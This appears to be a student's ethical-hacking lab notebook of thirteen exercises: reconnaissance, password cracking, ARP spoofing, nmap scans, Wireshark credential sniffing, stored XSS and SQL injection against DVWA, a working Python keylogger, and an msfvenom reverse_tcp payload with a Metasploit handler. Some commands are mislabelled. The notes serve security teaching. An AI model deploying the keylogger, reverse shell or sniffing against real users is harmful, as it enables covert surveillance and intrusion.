eh

1]  Use Google and Whois for Reconnaissance. 

who.is
WHOIS (pronounced as the phrase "who is") is a query and response protocol 
that is widely used for querying databases that store the registered users
 or assignees of an Internet resource, such as a domain name, an IP address
 block or an autonomous system, but is also used for a wider range of other 
information. 



2] Use CrypTool to encrypt and decrypt passwords using RC4 algorithm.

cryptool 
CrypTool is an open-source project that focuses on the free e-learning software CrypTool
 illustrating cryptographic and cryptanalytic concepts.
CrypTool implements more than 400 algorithms.
CrypTool is worldwide the most widespread e-learning software in the field of cryptology

RC4 algorithm
RC4 means Rivest Cipher 4 invented by Ron Rivest in 1987 for RSA Security. 
It is a Stream Ciphers. Stream Ciphers operate on a stream of data byte by byte. 
RC4 stream cipher is one of the most widely used stream ciphers 
because of its simplicity and speed of operation.
steps:-->Write a text in the file .go to Encrypt/Decrypt >Symmetric(modern)>RC4
           key enter-->8bit -->click on encrypt
ii)analysis --> symmetric (mordern) RC4 --> brute force analysis (result) --> click on start
encrpyted data will be there



3] Use Cain and Abel for cracking Windows account password using Dictionary attack
 and to decode wireless network passwords

steps:i) Open Cain & Abel →Click Hash Calculator→ Enter the Password to Convert.

**dictionary attack --> in the empty field paste the value you have just converted(md5 value)
then right clickon value--> dictionary attack-- dialog box will appear click on file
-->add to list--> wordlist--> check all the option--> start

**brute force attack --> Right click on the value→ brute force attack→dialog box will appear 



4] Run and analyze the output of the commands on Linux – ifconfig, ping, netstat,traceroute

1.ifconfig:
ifconfig(interface configuration) command is used to initialize an interface assign.
If Address to interface and enable or disable interface on demand with this command 
you can view IP address and Hardware/MAC address assign to interface.

2.ping www.google.com
PING(Packet Internet Groper) command is the best way to test the connectivity
 between two nodes. Whether it is Local Area Network (LAN) or Wide Area Network (WAN).
Ping use ICMP (Internet Control Message Protocol) to communicate to other devices. 

3.netstat -r
 (Network Statistics) commands display connector info, routing table information etc. 
To displays info routing table information use opton as -r

4.traceroute www.youtube.com or traceroute 4.2.2.2
traceroute is a network troubleshooting utility which shows number 
of hops taken to reach destination also determine packets travelling path.
 Below we are tracing route to Global DNS server IP address and able to reach 
destination also shows path of that packets is travelling.




5]Perform ARP Poisoning in Windows.

How does ARP Poisoning attack work?
ARP Poisoning (also known as ARP Spoofing) is a type of cyber attack carried 
out over a Local Area Network (LAN) that involves sending malicious ARP packets 
to a default gateway on a LAN in order to change the pairings in its IP to MAC address
 table. ARP Protocol translates IP addresses into MAC addresses.
steps:i)arp -a

ipconfig/all

arp  -s ip-address typ  8c-89-a5-ff-ff

arp -a 

arp -d  ip-address typ

arp -a




6]Use NMAP scanner to perform port scanning of various forms

ACK (nmap -sA -T4 scanme.nmap.org)==It never determines open (or even open filtered) ports. It is used to map out 
firewall rulesets, determining whether they are stateful or not and which ports are filtered.

FIN (nmap -sF -T4 scanme.nmap.org)
FIN Sets just the TCP FIN bit

NULL (nmap -sN -p 22 scanme.nmap.org)
NULL Does not set any bits (TCP flag header is 0)

SYN (namp -sN -p 22,113,139 scanme.namp.org)
  SYN scan is the default and most popular scan option for good reason. 
It can be performed quickly, scanning thousands of ports per second
 on a fast network not hampered by intrusive firewalls

XMAS (target 8.8.8.8  command--> nmap -sX 8.8.8.8)
Sets the FIN, PSH and URG flags, lighting the packet up like a Christmas tree






7] Use Wireshark (Sniffer) to capture network traffic and analyze

Wireshark is a network protocol analyzer, or an application that captures packets from a
 network  connection, such as from your computer to your home office or the internet.
 Packet is the name  given to a discrete unit of data in a typical Ethernet network. 
Wireshark is the most often-used packet sniffer in the world. Like any other 
packet sniffer,  Wireshark does three things: Packet Capture,Filtering,Visualization.

steps:- i)Open wireshark and then select wifi/ethernet capture.

ii)Now go to www.techpanda.org and login using username and password 

iii) type http in filter

iv) click on hypertext transfer protocol you will get loginn details






8] Use Nemesis to launch DoS attacker

Nemesis is a command-line network packet crafting and injection utility
 for UNIX-like and  Windows systems. Well suited for testing Network Intrusion 
Detection Systems, firewalls, IP  stacks and a variety of other tasks. As a command-line 
driven utility, it is perfect for automation  and scripting. 
Nemesis can natively craft and inject ARP, DNS, ETHERNET, ICMP, IGMP, IP, OSPF, RIP,  TCP and UDP packets.  

steps:- i) 
Open CMD with Administration Privalages → Change the path where software is loacted >>>NEMESIS.exe 





9]Simulate persistent cross-site scripting attack

Cross-site scripting attack:
Cross-site scripting, a security exploit in which the attacker inserts malicious 
client-side code into webpages, has been around since the 1990s and most major websites 
like Google, Yahoo and Facebook have all been affected by cross-site scripting flaws
 at some point. Attacks exploiting XSS vulnerabilities can steal data, take control 
of a user's session, run malicious code, or be used as part of a phishing scam.

steps:- i)open xampp and mysql and apache start

ii)https://dvwa.co.uk/ download dvwa file and extract in htdocs ..

iii)Now go to config file in dvwa and open the .dist file and clear the password and give username ‘root’ and save as phpfile

iv)save it as config.inc.php
Then go to browser and give the link http://www.localhost/DWVA_master/setup.php it will open the below window

v)Click on Create/Reset Database it will open the below window in that
window give the username ‘Admin’ and password ‘password’

vi)Now go to DVWA Security and set as low Click on submit

vii)) Now go to XSS(Stored)

Give the name that you want and Message in html format
test 
<b>hello</b>

click on sign guestbook 

again add script<script>alert("hacked website") and run again and give script...











10]  Session impersonation using Firefox and Tamper Data add-on.

steps:-i)1.Open Mozilla Firefox. And go to Add-ons

ii) 2.Then search for “tamper data”

3.Now click on “Tamper data for FF Quantum”

4.Click on Add to Firefox

5.Open new tab and search for www.razorba.com

6.Select any item

7.Click on “Add to Cart”

8.Then click on “Proceed to checkout”.

9.Now click on “One Day”

10.Then click on the blue icon at the right side of the page

11.Now click on “Yes”

12.Click on “PayPal”

ok-->ok-->ok-->






11]Perform SQL injection attack. 

SQL injection is a code injection technique, used to attack
 data-driven applications, in which malicious SQL statements 
are inserted into an entry field for execution (e.g., to dump
 the database contents to the attacker). SQL injection must exploit 
a security vulnerability in an application's software, for example, 
when user input is either incorrectly filtered for string literal escape 
characters embedded in SQL statements or user input is not strongly typed
 and unexpectedly executed. SQL injection is mostly known as an attack
 vector for websites but can be used to attack any type of SQL database. 

steps:- i)open xampp and mysql and apache start

ii)https://dvwa.co.uk/ download dvwa file and extract in htdocs ..

iii)Now go to config file in dvwa and open the .dist file and clear the password and give username ‘root’ and save as phpfile

iv)save it as config.inc.php
Then go to browser and give the link http://www.localhost/DWVA_master/setup.php it will open the below window

v)Click on Create/Reset Database it will open the below window in that
window give the username ‘Admin’ and password ‘password’

 vi)then go sql injection and perform in user id
 enter one by one...
 1=1 ,1 ,2,3,4,5,2=2,,2*
 done

12]Create a simple keylogger using python.

Source code:
from pynput.keyboard import Key,Listener

import logging

log_dir=""

logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s:')

def on_press(key):

    logging.info(str(key))

with Listener(on_press=on_press)as listener:

    listener.join()

**in terminal command: pip install pynput

run program then
Open Chrome and search anything 
you will get text file as output in same path...




13]Using Metasploit to exploit (Kali Linux) 

Kali Linux is a debian derived Linux distribution designed for digital forensics
 and penetration testing. Kali Linux comes with a number of tools aiding the
 purpose of penetration testing and network security. Kali Linux comes pre-installed 
with Metasploit Framework. 

step I)Before starting Kali Linux on your Virtual Machine go to the Setting->Network and 
set the Adapter as a Bridged Adapter

ii)After that start your virtual machine 

Step-2) Open Kali-Linux Terminal and Check the IP address of your machine using the below command 
>ifconfig 

iii) Start the postgresql service using the below command 
>service postgresql start 

Step-4) Then go to the console window of Metasploit using below command $msfconsole 

Step-5) Now host your msfvenom on the specific IP address to start Metasploit using below command 
>msfvenom  -p windows/metrpreter/reverse_tcp LHOST=192.168.0.101 LPORT=4444 -f exe >kale.exe 

6)Change the directory  >use exploit/multi/handler 
>set payload windows/meterpreter/reverse_tcp 

>set LHOST=192.168.0.101 

>set LPORT=4444 

>exploit

After that go to your windows and run that exe (Kale.exe) file then the session 
will start on your virtual machine 

Step-8) When the session will start then give the below command to check the your 
Metasploit is working or not $sysinfo 

Conclusion 

In conclusion, Metasploit framework is a powerful tool for exploiting a remote 
target machine. With more than 900 attacks obtained by multiple combinations 
of payloads and exploit types, the ever-increasing need for patching the 
vulnerabilities in the system can be dealt with a great deal of information 
about them and risk of an attack happening by exploiting a particular vulnerability. 



